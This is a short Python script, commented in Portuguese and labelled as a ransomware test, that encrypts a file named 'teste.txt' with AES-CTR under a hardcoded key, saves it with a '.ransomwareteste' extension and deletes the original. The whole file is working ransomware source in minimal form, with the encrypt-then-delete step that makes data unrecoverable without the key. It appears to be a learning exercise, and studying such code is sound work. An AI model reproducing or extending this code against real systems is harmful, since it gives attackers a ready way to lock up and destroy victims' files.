import os
import pyaes

## ler arquivo a ser criptografado

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## definir a chave de criptografia, deve ter 16 caracteres

key = b'teste-ransomware'
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## salvar arquivo criptografado

new_file_name = file_name + '.ransomwareteste'
new_file = open(f'{new_file_name}', 'wb')
new_file.write(crypto_data)
new_file.close()

## excluir arquivo original

os.remove(file_name)
